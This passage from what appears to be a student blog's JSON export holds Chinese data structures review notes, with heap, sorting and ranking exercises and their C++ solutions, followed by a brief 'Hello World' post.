10;\n\t\t\tmaxdig++;\n\t\t}\n\t\tbaseSort();\n\t\tcout << endl;\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### 堆中的路径\n\n题目:\n\n```\n将一系列给定数字插入一个初始为空的小顶堆H[]。随后对任意给定的下标i，打印从H[i]到根结点的路径。\n\n输入\n每组测试第1行包含2个正整数N和M(≤1000)，分别是插入元素的个数、以及需要打印的路径条数。下一行给出区间[-10000, 10000]内的N个要被插入一个初始为空的小顶堆的整数。最后一行给出M个下标。\n\n输出\n对输入中给出的每个下标i，在一行中输出从H[i]到根结点的路径上的数据。数字间以1个空格分隔，行末不得有多余空格。\n```\n\n样例：\n\n```\n5 3\n46 23 26 24 10\n5 4 3\n```\n\n样例输出：\n\n```\n24 23 10\n46 23 10\n26 10\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\nusing namespace std;\n\nint n, m;\nint num[1000];\n\nvoid heap(int pos, int len)\n{\n\tint minnum = num[pos];\n\tif(pos<<1 <= len)minnum = min(minnum, num[pos << 1]);\n\tif ((pos << 1 | 1) <= len)minnum = min(minnum, num[pos << 1 | 1]);\n\tif (minnum == num[pos << 1])\n\t{\n\t\tswap(num[pos], num[pos << 1]);\n\t\theap(pos << 1, len);\n\t}\n\tif (minnum == num[pos << 1 | 1])\n\t{\n\t\tswap(num[pos], num[pos << 1 | 1]);\n\t\theap(pos << 1 | 1, len);\n\t}\n}\n\nvoid createheap(int len)\n{\n\tfor (int i = len / 2; i > 0; i--)\n\t{\n\t\theap(i, len);\n\t}\n}\n\nvoid query(int x)\n{\n\tfor (int i = x; i > 0; i /= 2)\n\t{\n\t\tcout << num[i];\n\t\tif (i == 1)cout << endl;\n\t\telse cout << ' ';\n\t}\n}\n\nint main()\n{\n\tcin >> n >> m;\n\tfor (int i = 1; i <= n; i++)\n\t{\n\t\tcin >> num[i];\n\t\tcreateheap(i);\n\t}\n\twhile (m--)\n\t{\n\t\tint x;\n\t\tcin >> x;\n\t\tquery(x);\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### 插入排序还是归并排序\n\n题目:\n\n```\n根据维基百科的定义：\n插入排序是迭代算法，逐一获得输入数据，逐步产生有序的输出序列。每步迭代中，算法从输入序列中取出一元素，将之插入有序序列中正确的位置。如此迭代直到全部元素有序。\n归并排序进行如下迭代操作：首先将原始序列看成 N 个只包含 1 个元素的有序子序列，然后每次迭代归并两个相邻的有序子序列，直到最后只剩下 1 个有序的序列。\n现给定原始序列和由某排序算法产生的中间序列，请你判断该算法究竟是哪种排序算法？\n\n输入\n输入在第一行给出正整数 N (≤100)；随后一行给出原始序列的 N 个整数；最后一行给出由某排序算法产生的中间序列。这里假设排序的目标序列是升序。数字间以空格分隔。\n\n输出\n首先在第 1 行中输出Insertion Sort表示插入排序、或Merge Sort表示归并排序；然后在第 2 行中输出用该排序算法再迭代一轮的结果序列。题目保证每组测试的结果是唯一的。数字间以空格分隔，且行首尾不得有多余空格。\n```\n\n样例：\n\n```\n10\n3 1 2 8 7 5 9 4 6 0\n1 2 3 7 8 5 9 4 6 0\n```\n\n样例输出：\n\n```\nInsertion Sort\n1 2 3 5 7 8 9 4 6 0\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<string>\nusing namespace std;\n\n#define maxn 1000\n\nint t, n;\nint num1[maxn], num2[maxn];\nint tmp[maxn];\nstring mergestr, insertstr, midstr;\n\nvoid merge(int InitList[], int mergedList[],int l, int mid, int r) \n{\n\tint i = l, j = mid, k = l;\n\twhile (i < mid && j < r)\n\t{\n\t\tif (InitList[i] <= InitList[j])\n\t\t{\n\t\t\tmergedList[k] = InitList[i]; i++;  k++;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tmergedList[k] = InitList[j]; j++;  k++; \n\t\t}\n\t}\n\twhile (i < mid) \n\t{\n\t\tmergedList[k] = InitList[i]; \n\t\ti++, k++; \n\t}\n\twhile (j < r) \n\t{\n\t\tmergedList[k] = InitList[j]; \n\t\tj++, k++; \n\t}\n}\n\nbool checkmerge()\n{\n\tmergestr = \"\";\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tmergestr += to_string(num1[i]);\n\t}\n\tif (mergestr == midstr)return true;\n\treturn false;\n}\n\nbool checkinsert()\n{\n\tinsertstr = \"\";\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tinsertstr += to_string(num2[i]);\n\t}\n\tif (insertstr == midstr)return true;\n\treturn false;\n}\n\nvoid print(int op)\n{\n\tif (op)cout << \"Insertion Sort\" << endl;\n\telse cout << \"Merge Sort\" << endl;\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tif (op)cout << num2[i];\n\t\telse cout << num1[i];\n\t\tif (i == n - 1)cout << endl;\n\t\telse cout << ' ';\n\t}\n}\n\nvoid mergeSort()\n{\n\tbool flag = 0;\n\tfor (int i = 2; i <=2 *  n; i *= 2)\n\t{\n\t\tfor (int st = 0; st < n; st += i)\n\t\t{\n\t\t\tint mid = st + i / 2;\n\t\t\tfor (int j = 0; j < n; j++)tmp[j] = num1[j];\n\t\t\tmerge(tmp, num1, st, mid, min(st + i,n));\n\t\t}\n\t\tif (flag)\n\t\t{\n\t\t\tprint(0);\n\t\t\tbreak;\n\t\t}\n\t\tif (checkmerge())flag = 1;\n\t}\n}\n\nvoid insertSort()\n{\n\tbool flag = 0;\n\tint j, tmp;\n\tfor (int i = 1; i < n; i++)\n\t{\n\t\t\n\t\ttmp = num2[i];\n\t\tfor (j = i - 1; j >= 0 && num2[j] > tmp; j--)\n\t\t{\n\t\t\tnum2[j + 1] = num2[j];\n\t\t}\n\t\tnum2[j + 1] = tmp;\n\t\tif (flag)\n\t\t{\n\t\t\tprint(1);\n\t\t\tbreak;\n\t\t}\n\t\tif (checkinsert())flag = 1;\n\t}\n}\n\n\nint main()\n{\n\tcin >> n;\n\tfor (int i = 0; i < n; i++)cin >> num1[i], num2[i] = num1[i];\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tint x;\n\t\tcin >> x;\n\t\tmidstr += to_string(x);\n\t}\n\tmergeSort();\n\tinsertSort();\n\treturn 0;\n}\n```\n\n\n\n#### 与零交换\n\n题目:\n\n```\n将 { 0, 1, 2, ..., N-1 } 的任意一个排列进行排序并不困难，这里加一点难度，要求你只能通过一系列的 Swap(0, *) —— 即将一个数字与 0 交换 —— 的操作，将初始序列增序排列。例如对于初始序列 { 4, 0, 2, 1, 3 }，我们可以通过下列操作完成排序：\nSwap(0, 1) ⟹ { 4, 1, 2, 0, 3 }\nSwap(0, 3) ⟹ { 4, 1, 2, 3, 0 }\nSwap(0, 4) ⟹ { 0, 1, 2, 3, 4 }\n本题要求你找出将前 N 个非负整数的给定排列进行增序排序所需要的最少的与 0 交换的次数。\n\n输入\n输入在第一行给出正整数 N (≤10e5)；随后一行给出{ 0, 1, 2, ..., N-1 } 的一个排列。数字间以空格分隔。\n\n输出\n在一行中输出将给定序列进行增序排序所需要的最少的与 0 交换的次数。\n```\n\n样例：\n\n```\n10\n3 5 7 2 6 4 9 0 8 1\n```\n\n样例输出：\n\n```\n9\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\nusing namespace std;\n\nint n;\nint num[1000];\n\nbool check()\n{\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tif (num[i] != i)return false;\n\t}\n\treturn true;\n}\n\nvoid zerosort()\n{\n\tint cnt = 0;\n\twhile (!check())\n\t{\n\t\tint z_index, target_index;\n\t\tif (num[0] == 0)\n\t\t{\n\t\t\tz_index = 0;\n\t\t\tfor (int i = 0; i < n; i++)\n\t\t\t{\n\t\t\t\tif (num[i] != i)target_index = i;\n\t\t\t}\n\t\t}//第一位为0时若还未有序则找到第一个非有序的下标交换\n\t\telse\n\t\t{\n\t\t\tfor (int i = 0; i < n; i++)\n\t\t\t{\n\t\t\t\tif (!num[i])z_index = i;\n\t\t\t}\n\t\t\tfor (int i = 0; i < n; i++)\n\t\t\t{\n\t\t\t\tif (num[i] == z_index)target_index = i;\n\t\t\t}\n\t\t}\n\t\tswap(num[z_index], num[target_index]);\n\t\tcnt++;\n\t}\n\tcout << cnt;\n}\n\nint main()\n{\n\tcin >> n;\n\tfor (int i = 0; i < n; i++)cin >> num[i];\n\tzerosort();\n\treturn 0;\n}\n```\n\n\n\n#### 奥运排行榜\n\n注意：排名并列的时候名次相同，如果有两个并列第一，那么这两个都是第一名，第三个为第三名\n\n题目:\n\n```\n每年奥运会各大媒体都会公布一个排行榜，但是细心的读者发现，不同国家的排行榜略有不同。比如中国金牌总数列第一的时候，中国媒体就公布“金牌榜”；而美国的奖牌总数第一，于是美国媒体就公布“奖牌榜”。如果人口少的国家公布一个“国民人均奖牌榜”，说不定非洲的国家会成为榜魁…… 现在就请你写一个程序，对每个前来咨询的国家按照对其最有利的方式计算它的排名。\n\n\n输入\n输入的第一行给出两个正整数N和M（≤224，因为世界上共有224个国家和地区），分别是参与排名的国家和地区的总个数、以及前来咨询的国家的个数。为简单起见，我们把国家从0 ~ N−1编号。之后有N行输入，第i行给出编号为i−1的国家的金牌数、奖牌数、国民人口数（单位为百万），数字均为[0,1000]区间内的整数，用空格分隔。最后面一行给出M个前来咨询的国家的编号，用空格分隔。\n\n输出\n在一行里顺序输出前来咨询的国家的排名:计算方式编号。其排名按照对该国家最有利的方式计算；计算方式编号为：金牌榜=1，奖牌榜=2，国民人均金牌榜=3，国民人均奖牌榜=4。输出间以空格分隔，输出结尾不能有多余空格。\n\n若某国在不同排名方式下有相同名次，则输出编号最小的计算方式。\n```\n\n样例：\n\n```\n4 4\n51 100 1000\n36 110 300\n6 14 32\n5 18 40\n0 1 2 3\n```\n\n样例输出：\n\n```\n1:1 1:2 1:3 1:4\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<algorithm>\nusing namespace std;\n\nint n, m;\n\nstruct gold {\n\tint id, go, rank = 0;\n\tbool operator <(const gold& a)const {\n\t\treturn go > a.go;\n\t}\n}g[225];\n\nstruct medal {\n\tint id, md, rank = 0;\n\tbool operator <(const medal& a) const{\n\t\treturn md > a.md;\n\t}\n}me[225];\n\nstruct avr_gold {\n\tint id;\n\tfloat avr;\n\tint rank;\n\tbool operator < (const avr_gold& a) const{\n\t\treturn avr > a.avr;\n\t}\n}avr_g[225];\n\nstruct avr_medal {\n\tint id;\n\tfloat avr;\n\tint rank = 0;\n\tbool operator < (const avr_medal& a)const {\n\t\treturn avr > a.avr;\n\t}\n}avr_m[225];\n\nint main()\n{\n\tcin >> n>>m;\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tint gold, medal, popu;\n\t\tcin >> gold >> medal >> popu;\n\t\tg[i] = { i,gold };\n\t\tme[i] = { i,medal };\n\t\tavr_g[i] = { i,(float(gold) / float(popu)) };\n\t\tavr_m[i] = { i,(float(medal) / float(popu)) };\n\t}\n\tsort(g, g + n);\n\tsort(me, me + n);\n\tsort(avr_g, avr_g + n);\n\tsort(avr_m, avr_m + n);\n\n\tint r = 1;\n\tg[0].rank = me[0].rank = avr_g[0].rank = avr_m[0].rank = 1;\n\tfor (int j = 1; j < n; j++)\n\t{\n\t\tr++;\n\t\tif (g[j].go == g[j - 1].go)g[j].rank = g[j - 1].rank;\n\t\telse g[j].rank = r;\n\t}\n\tr = 1;\n\tfor (int j = 1; j < n; j++)\n\t{\n\t\tr++;\n\t\tif (me[j].md == me[j - 1].md)me[j].rank = me[j - 1].rank;\n\t\telse me[j].rank = r;\n\t}\n\tr = 1;\n\tfor (int j = 1; j < n; j++)\n\t{\n\t\tr++;\n\t\tif (avr_g[j].avr == avr_g[j - 1].avr)avr_g[j].rank = avr_g[j - 1].rank;\n\t\telse avr_g[j].rank = r;\n\t}\n\tr = 1;\n\tfor (int j = 1; j < n; j++)\n\t{\n\t\tr++;\n\t\tif (avr_m[j].avr == avr_m[j - 1].avr)avr_m[j].rank = avr_m[j - 1].rank;\n\t\telse avr_m[j].rank = r;\n\t}\n\n\tfor (int i = 0; i < m; i++)\n\t{\n\t\tint x;\n\t\tcin >> x;\n\t\tint index[4] = { 0 };\n\n\t\tfor (int j = 0; j < n; j++)\n\t\t{\n\t\t\tif (g[j].id == x)index[0] = g[j].rank;\n\t\t\tif (me[j].id == x)index[1] = me[j].rank;\n\t\t\tif (avr_g[j].id == x)index[2] = avr_g[j].rank;\n\t\t\tif (avr_m[j].id == x)index[3] = avr_m[j].rank;\n\t\t}\n\n\t\tint minn = 225;\n\t\tfor (int j = 0; j < 4; j++)\n\t\t{\n\t\t\tminn = min(minn, index[j]);\n\t\t}\n\t\tfor (int j = 0; j < 4; j++)\n\t\t{\n\t\t\tif (index[j] == minn)\n\t\t\t{\n\t\t\t\tcout << index[j] << ':' << j + 1 << ' ';//注意第二个输出的是计算方式不是序号\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### 各排序算法的比较\n\n![image-20230202104500552](深圳大学数据结构期末复习与实验代码/image-20230202104500552.png)\n\n\n\n\n\n","tags":["数据结构"],"categories":["数据结构"]},{"title":"Hello World","url":"/2022/05/14/hello-world/","content":"# This is my first blog\n\n![fk](hello-world/fk.jpg)\n\n## aminuosi\n\n"}]